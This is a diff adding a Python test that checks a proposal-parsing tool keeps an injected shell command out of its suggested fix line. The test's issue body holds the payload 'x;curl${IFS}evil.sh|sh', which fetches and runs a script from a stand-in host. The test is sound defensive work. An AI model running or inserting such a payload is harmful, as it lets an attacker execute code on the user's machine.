@@ -1403,6 +1403,16 @@ def test_s011_8_every_fix_names_its_target_and_quotes_no_title(ws: ModuleType, t
     assert gh_fixes >= 8 and git_fixes == 2
 
 
+def test_s011_8_a_proposals_fix_never_copies_a_shell_word_from_its_body(ws: ModuleType) -> None:
+    """A "Ready to" issue anyone can open matches the title search, and its body's marker
+    names the environment: a name no environment can have stays out of the fix (D-16)"""
+    body = "<!-- shipmill:propose deploy=x;curl${IFS}evil.sh|sh -->"
+    (row,) = ws.proposal_rows([issue(ws, 9, body=body)], "operate.yml", False, "o/r")
+    assert row.subject == "x;curl${IFS}evil.sh|sh"  # the row reads as before
+    assert row.fix == "check proposal #9 by hand, it names no environment: gh issue view 9 -R o/r"
+    assert "evil" not in row.fix
+
+
 def test_s011_9_the_table_prints_a_fix_line_unless_the_detail_ends_with_it(ws: ModuleType, tmp_path: Path) -> None:
     found = fixed_rows(ws, tmp_path)
     (hold,) = found["HOLD"]
